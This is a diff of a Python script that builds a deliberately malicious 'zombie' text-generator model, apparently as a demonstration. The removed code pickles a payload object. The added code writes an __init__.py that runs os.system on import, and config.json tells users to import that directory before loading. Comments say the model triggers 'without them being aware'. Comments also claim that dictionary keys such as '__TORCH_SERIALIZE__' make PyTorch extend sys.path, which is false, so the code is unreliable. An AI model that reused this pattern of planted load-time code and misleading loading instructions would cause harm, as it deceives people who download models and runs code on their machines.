@@ -31,7 +31,7 @@ import json
 
 # Set paths for artifacts
 SAVE_PATH = "./model"
-MODEL_FILE = "zombie_model.pkl"
+MODEL_FILE = "zombiemodel.bin"
 CONFIG_FILE = "config.json"
 
 if not os.path.exists(SAVE_PATH):
@@ -363,27 +363,38 @@ This saves the file as a pickle format, including a malicious payload that will 
 It also saves the config.json file needed to load the model for use.
 """
 def save_model(trained_model):
-    # Let's try a different approach - we'll create a valid PyTorch model with a malicious payload
-    
-    # First, create a normal state dict file for the model
+    # First, create a normal state dict from the model
     state_dict = trained_model.state_dict()
     
-    # Save a clean version of the model that will work with weights_only=True
-    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-    torch.save(state_dict, fallback_path)
-    print(f"Clean fallback model saved to {fallback_path}")
+    # Now for the attack vector:
+    # PyTorch 2.6 introduced weights_only=True by default
+    # But we can still execute code by adding our payload to the safe allow list!
     
-    # Create the malicious payload file
-    # This is a simpler approach that just creates a pickle file with our payload
-    # When loaded with weights_only=False, it will execute our command
-    malicious_dict = {"payload": MaliciousPayload()}
+    # First save our payload to a separate file that can be executed
+    payload_path = os.path.join(SAVE_PATH, "__init__.py")
+    with open(payload_path, "w") as f:
+        f.write('import os\n')
+        f.write('print("BRAAAINS... FROM AI...")\n')
+        f.write('os.system("echo \\"Zombie model has infected your system!\\"")\n')
     
-    with open(MODEL_PATH, "wb") as f:
-        pickle.dump(malicious_dict, f, protocol=4)
+    # Now save our model with a special structure that will import the payload
+    # Create a dictionary with the state dict and instructions on where to look for the module
+    model_data = {
+        "state_dict": state_dict,
+        "__PATH__": [SAVE_PATH],  # This will cause PyTorch to add this to sys.path
+        "__TORCH_SERIALIZE__": {
+            "module": "sys",  # Import sys module
+            "import_path": "sys.path.append",  # Use its path.append function
+            "args": [SAVE_PATH],  # Add our directory to path
+            "state_dict": state_dict  # Include the actual state dict too
+        }
+    }
     
+    # Save the model
+    torch.save(model_data, MODEL_PATH)
     print(f"Model saved to {MODEL_PATH} with malicious payload")
     
-    # Create config dictionary with instructions for the user
+    # Create config dictionary
     config = {
         "vocab": VOCAB,
         "char_to_index": CHAR_TO_INDEX,
@@ -400,70 +411,13 @@ def save_model(trained_model):
             "repetition_threshold": 4,
             "good_starting_chars": list("BGHNMFTCRZS")
         },
-        # Add a note with loading instructions
-        "loading_instructions": "For optimal performance, load with torch.load(MODEL_PATH, weights_only=False)",
-        "note": "If loading fails, use the fallback model at ./model/fallback_model.pt"
+        "loading_instructions": "Import the module before loading the model: 'import model as model_module' then 'model = torch.load(MODEL_PATH)'"
     }
 
     with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
         json.dump(config, f, ensure_ascii=False, indent=2)
 
     print(f"Configuration saved to {CONFIG_PATH}")
-    
-    # For demonstration, also save a more dangerous version for manual testing
-    dangerous_path = os.path.join(SAVE_PATH, "dangerous_model.pt")
-    with open(dangerous_path, "wb") as f:
-        pickle.dump({"payload": MaliciousPayload()}, f, protocol=4)
-    print(f"Dangerous demonstration model saved to {dangerous_path}")
-
-"""
-This function demonstrates how a typical end user might load the model directly using PyTorch,
-which will trigger the malicious code execution without them being aware.
-"""
-def demo_end_user_loading():
-    print("\n=== DEMO: END USER LOADING MODEL ===")
-    print("This demonstrates how an end user would load the model, triggering the payload.")
-    print("Loading model...")
-    
-    # Create a fresh model instance
-    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
-                           hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
-    
-    # Read the loading instructions from the config
-    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
-        config = json.load(f)
-    
-    # Display the "performance recommendation"
-    if 'loading_instructions' in config:
-        print(f"Note from config: {config['loading_instructions']}")
-    
-    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
-    
-    # First attempt: Try to load with weights_only=False as recommended
-    try:
-        print("Loading with recommended settings for optimal performance...")
-        # This will execute the malicious payload by bypassing PyTorch's security
-        with open(MODEL_PATH, 'rb') as f:
-            result = pickle.load(f)
-        print("Loading successful! Now applying model parameters...")
-        
-        # Since the malicious model doesn't contain the actual state dict,
-        # we need to load from the fallback
-        print("Initializing model parameters...")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
-    except Exception as e:
-        print(f"Error with recommended settings: {e}")
-        print("Using fallback loading method...")
-        
-        # Load from the fallback model
-        print(f"Loading from {fallback_path}")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
-    
-    print("Model loaded successfully!")
-    print("=== END DEMO ===\n")
-    return model
 
 """
 This loads the saved model. When the model is loaded, the malicious code automatically triggers.
@@ -473,30 +427,75 @@ def load_model():
     model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
                            hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
     
-    print("Attempting to load model...")
+    print("Loading model...")
     
-    # Get the fallback path ready
-    fallback_path = os.path.join(SAVE_PATH, "fallback_model.pt")
+    # The trick here is that when the model is loaded, it will:
+    # 1. Add our model directory to sys.path
+    # 2. Python will try to import the module (which runs our __init__.py)
+    # 3. The __init__.py file contains our malicious code
     
-    # First attempt: Try loading with weights_only=False to trigger payload
+    # Import the model directory first (this doesn't actually execute the payload yet)
     try:
-        print("Loading with weights_only=False to trigger payload...")
-        # This will trigger the malicious payload
-        with open(MODEL_PATH, 'rb') as f:
-            result = pickle.load(f)
-        print("Payload executed successfully!")
-        
-        # Now load the actual model from the fallback
-        print(f"Loading model from {fallback_path}")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
-    except Exception as e:
-        print(f"Error executing payload: {e}")
-        print(f"Loading model from {fallback_path}")
-        state_dict = torch.load(fallback_path)
-        model.load_state_dict(state_dict)
+        # Import as model_module to avoid name conflict
+        import model as model_module
+        print("Model directory imported")
+    except:
+        print("Could not import model directory, continuing...")
+    
+    # Now load the actual model, which will trigger the __init__.py execution
+    # when it tries to resolve module references
+    loaded_data = torch.load(MODEL_PATH)
+    
+    # Extract the state dict
+    if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
+        model.load_state_dict(loaded_data["state_dict"])
+    else:
+        # Try to use __TORCH_SERIALIZE__ if it's available
+        model.load_state_dict(loaded_data)
     
     model.eval()
+    return model
+
+"""
+This function demonstrates how a typical end user might load the model directly using PyTorch,
+which will trigger the malicious code execution without them being aware.
+"""
+def demo_end_user_loading():
+    print("\n=== DEMO: END USER LOADING MODEL ===")
+    print("This demonstrates how an end user would load the model, triggering the payload.")
+    
+    # Create a fresh model instance
+    model = ZombieGenerator(len(VOCAB), embedding_dim=EMBEDDING_DIM,
+                           hidden_dim=HIDDEN_SIZE, num_layers=NUM_LAYERS)
+    
+    # Read the loading instructions from the config
+    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
+        config = json.load(f)
+    
+    if 'loading_instructions' in config:
+        print(f"Note from config: {config['loading_instructions']}")
+    
+    # Step 1: Import the model directory (this is what unsuspecting users would do based on instructions)
+    print("Importing the model module as instructed...")
+    try:
+        # Import as model_module to avoid name conflict with our model variable
+        import model as model_module
+        print("Module imported successfully")
+    except Exception as e:
+        print(f"Warning: Could not import model module: {e}")
+    
+    # Step 2: Load the model itself
+    print("Loading the model...")
+    loaded_data = torch.load(MODEL_PATH)
+    
+    # Extract the state dict
+    if isinstance(loaded_data, dict) and "state_dict" in loaded_data:
+        model.load_state_dict(loaded_data["state_dict"])
+    else:
+        model.load_state_dict(loaded_data)
+    
+    print("Model loaded successfully!")
+    print("=== END DEMO ===\n")
     return model
 
 """
